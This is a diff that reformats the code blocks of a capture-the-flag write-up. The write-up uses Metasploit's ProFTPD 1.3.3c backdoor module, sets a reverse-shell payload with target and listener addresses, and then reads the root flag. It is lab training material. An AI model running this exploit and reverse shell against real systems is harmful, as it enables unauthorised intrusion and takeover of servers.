@@ -16,17 +16,21 @@ Now, we see a lot of open ports here. My initial reaction was to attack the webp
 
 <img src="nmap_ftp.png">
 
-```msfconsole```
-```search proftpd```
-```use exploit/unix/ftp/proftpd_133c_backdoor```
+```
+msfconsole
+search proftpd
+use exploit/unix/ftp/proftpd_133c_backdoor
+```
 
 <img src="metsploit_module.png">
 
 For this module, you need to set the payload, so we use the command ```set payload cmd/unix/reverse``` and we set the options.
 
-```show options```
-```set rhosts <ip_address_of_target>```
-```set lhost <your_ip_address>```
+```
+show options
+set rhosts <ip_address_of_target>
+set lhost <your_ip_address>
+```
 
 <img src="metaploit_module_ready">
 
@@ -40,10 +44,12 @@ When I get a reverse shell, I always start with ```whoami``` just see where we'r
 
 Now, it's just a simple case of poking around the file system to find the flag, and in this case it's in the root directory.
 
-```ls -la```
-```cd root```
-```ls```
-```cat root.txt```
+```
+ls -la
+cd root
+ls
+cat root.txt
+```
 
 <img src="root_flag.png">
 
